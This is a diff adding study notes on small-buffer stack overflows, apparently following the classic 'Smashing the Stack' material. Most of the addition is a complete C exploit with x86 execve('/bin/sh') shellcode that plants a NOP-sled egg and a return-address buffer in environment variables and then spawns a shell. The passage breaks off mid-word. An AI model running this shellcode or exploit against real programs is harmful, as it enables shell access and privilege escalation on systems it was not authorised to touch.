@@ -411,3 +411,73 @@ void main(int argc, char *argv[]) {
 ```
 - a good selection for our buffer size is about 100 bytes more than the size of the buffer we are trying to overflow, this will place our code at the end of the buffer we are trying to overflow, giving a lot of space for the NOPs
 ## Small Buffer Overflows
+- sometimes the buffer is too small for the shellcode to fit
+- sometimes the number of NOPs you can pad the front of the string with is so small that the chances of guessing their address is minuscule
+- to obtain a shell you need another techniques
+	- this approach only works when you have access to the program's environment variables
+	- place the shellcode in an environment variable, and then overflow the buffer with the address of this variable in memory
+		- also increases your chances of the exploit working as you can make the environment variable holding the shell code as large as you want
+	- environment variables are stored in the top of the stack when the program is started, any modification by `setenv()` are then allocated elsewhere
+```c
+#include <stdlib.h>
+
+#define DEFAULT_OFFSET                    0
+#define DEFAULT_BUFFER_SIZE             512
+#define DEFAULT_EGG_SIZE               2048
+#define NOP                            0x90
+
+char shellcode[] =
+  "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"
+  "\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
+  "\x80\xe8\xdc\xff\xff\xff/bin/sh";
+
+unsigned long get_esp(void) {
+   __asm__("movl %esp,%eax");
+}
+
+void main(int argc, char *argv[]) {
+  char *buff, *ptr, *egg;
+  long *addr_ptr, addr;
+  int offset=DEFAULT_OFFSET, bsize=DEFAULT_BUFFER_SIZE;
+  int i, eggsize=DEFAULT_EGG_SIZE;
+
+  if (argc > 1) bsize   = atoi(argv[1]);
+  if (argc > 2) offset  = atoi(argv[2]);
+  if (argc > 3) eggsize = atoi(argv[3]);
+
+
+  if (!(buff = malloc(bsize))) {
+    printf("Can't allocate memory.\n");
+    exit(0);
+  }
+  if (!(egg = malloc(eggsize))) {
+    printf("Can't allocate memory.\n");
+    exit(0);
+  }
+
+  addr = get_esp() - offset;
+  printf("Using address: 0x%x\n", addr);
+
+  ptr = buff;
+  addr_ptr = (long *) ptr;
+  for (i = 0; i < bsize; i+=4)
+    *(addr_ptr++) = addr;
+
+  ptr = egg;
+  for (i = 0; i < eggsize - strlen(shellcode) - 1; i++)
+    *(ptr++) = NOP;
+
+  for (i = 0; i < strlen(shellcode); i++)
+    *(ptr++) = shellcode[i];
+
+  buff[bsize - 1] = '\0';
+  egg[eggsize - 1] = '\0';
+
+  memcpy(egg,"EGG=",4);
+  putenv(egg);
+  memcpy(buff,"RET=",4);
+  putenv(buff);
+  system("/bin/bash");
+}
+```
+- depending how much environment data the exploit program has compared with the program you are trying to exploit the gu
